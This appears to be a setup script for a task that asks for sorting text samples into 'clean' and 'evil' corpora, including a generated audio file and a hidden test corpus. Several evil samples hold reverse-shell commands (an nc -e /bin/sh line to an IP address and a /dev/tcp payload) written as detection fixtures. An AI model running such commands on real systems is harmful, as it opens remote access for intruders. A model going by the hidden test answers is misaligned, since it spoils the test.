#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip espeak ffmpeg
    pip3 install pytest

    # Create directories for the task
    mkdir -p /app/hidden_corpus/clean
    mkdir -p /app/hidden_corpus/evil
    mkdir -p /home/user/sample_corpus/clean
    mkdir -p /home/user/sample_corpus/evil

    # Generate the intercepted audio file
    espeak -w /app/intercepted_call.wav "Attention all personnel. The top secret projects we are working on are Project Kraken, Project Leviathan, and Project Behemoth. Ensure all related communications are encrypted."

    # Populate sample corpus
    echo "Normal network traffic without any sensitive information." > /home/user/sample_corpus/clean/sample1.txt
    echo "GET /index.html HTTP/1.1\nHost: example.com" > /home/user/sample_corpus/clean/sample2.txt

    echo "We must ensure the success of Project Kraken." > /home/user/sample_corpus/evil/sample1.txt
    echo "Here is the key:\n-----BEGIN OPENSSH PRIVATE KEY-----\n..." > /home/user/sample_corpus/evil/sample2.txt
    echo "Attempting to run: nc -e /bin/sh 10.0.0.1 4444" > /home/user/sample_corpus/evil/sample3.txt

    # Populate hidden corpus (minimal subset for testing purposes)
    echo "This is a completely benign log entry." > /app/hidden_corpus/clean/hidden1.txt
    echo "Status update on Leviathan." > /app/hidden_corpus/evil/hidden1.txt
    echo "Reverse shell payload: /bin/bash -i >& /dev/tcp/..." > /app/hidden_corpus/evil/hidden2.txt

    # Create user and set permissions
    useradd -m -s /bin/bash user || true
    chmod -R 777 /app
    chmod -R 777 /home/user
